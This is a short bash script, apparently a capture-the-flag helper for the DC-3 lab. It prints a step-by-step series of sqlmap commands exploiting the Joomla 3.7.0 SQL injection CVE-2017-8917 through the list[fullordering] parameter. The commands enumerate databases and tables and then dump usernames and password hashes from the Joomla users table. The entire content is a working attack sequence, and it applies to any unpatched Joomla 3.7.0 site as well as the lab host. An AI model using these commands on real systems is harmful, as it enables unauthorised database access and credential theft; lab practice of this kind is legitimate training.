#!/bin/bash
###############################################################################
# SQLMap Commands for DC-3 CTF
# CVE-2017-8917 - Joomla 3.7.0 SQL Injection
###############################################################################

# Target URL with vulnerable parameter
TARGET="http://dc-3/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]="

echo "[*] DC-3 SQL Injection Exploitation Commands"
echo "[*] Target: $TARGET"
echo ""

# Step 1: Enumerate databases
echo "[1] Enumerate databases:"
echo "sqlmap -u \"$TARGET\" --batch --dbs"
echo ""

# Step 2: Enumerate tables in joomladb
echo "[2] Enumerate tables in joomladb:"
echo "sqlmap -u \"$TARGET\" -D joomladb --batch --tables"
echo ""

# Step 3: Dump users table
echo "[3] Dump #__users table:"
echo "sqlmap -u \"$TARGET\" -D joomladb -T '#__users' --batch --dump"
echo ""

# Step 4: Get columns
echo "[4] Get columns from #__users:"
echo "sqlmap -u \"$TARGET\" -D joomladb -T '#__users' --batch --columns"
echo ""

# Step 5: Extract only username and password
echo "[5] Extract credentials:"
echo "sqlmap -u \"$TARGET\" -D joomladb -T '#__users' -C 'username,password' --batch --dump"
